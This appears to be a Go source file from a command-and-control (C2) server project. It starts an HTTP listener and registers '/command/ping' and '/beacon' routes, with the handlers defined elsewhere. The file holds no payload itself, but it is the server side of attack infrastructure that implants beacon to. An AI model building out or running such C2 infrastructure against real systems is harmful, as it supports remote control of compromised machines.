package c2

import (
	"fmt"
	"log"
	"net/http"

	"server/handlers"
)

func HttpInit(port string) {
	fmt.Printf("[*HTTP] - C2 server listening on port %s...\n", port)

	var serverPort string = fmt.Sprintf(":%s", port)

	/* Routes */
	http.HandleFunc("/command/ping", handlers.PingC2)
	http.HandleFunc("/beacon", handlers.Beacon)

	/* Run server */
	log.Fatal(http.ListenAndServe(serverPort, nil))
}